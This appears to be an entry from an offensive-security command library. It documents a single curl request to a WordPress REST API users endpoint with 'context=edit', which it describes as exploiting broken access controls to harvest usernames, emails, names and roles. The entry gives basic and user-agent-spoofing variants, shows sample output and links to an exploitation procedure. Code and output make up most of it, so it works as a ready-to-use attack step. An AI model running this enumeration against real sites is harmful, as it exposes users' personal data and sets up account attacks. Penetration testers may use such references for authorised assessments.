---
id: cmd-uuid-001
data: 'curl -X GET "https://target.com/wp-json/wp/v2/users?context=edit"'
tags:
  - wordpress
  - enumeration
  - http
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.174Z'
verified: false
validated: true
submitted: true
---
# wp-rest-api-get-users-edit

## Command

```bash
curl -X GET "https://target.com/wp-json/wp/v2/users?context=edit"
```

## Description

This command sends an unauthenticated GET request to the WP REST API users endpoint with the edit context, exploiting broken access controls to retrieve sensitive user information including usernames, emails, names, registration dates, and roles.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target.com` | The domain or IP of the WordPress target site | Yes |
| `context=edit` | Specifies the edit context to expose sensitive fields | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://example.com/wp-json/wp/v2/users?context=edit"
```

### Advanced Usage

```bash
curl -X GET "https://example.com/wp-json/wp/v2/users?context=edit" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

JSON array of user objects, e.g., [
  {
    "id": 1,
    "username": "admin",
    "email": "admin@example.com",
    "first_name": "John",
    "last_name": "Doe",
    "registered_date": "2023-01-01T00:00:00",
    "capabilities": {"administrator": true}
  }
]. Up to 10 users by default.

## Related

- [[Related Procedure|procedures/Exploit-WP-REST-API-User-Enumeration]]
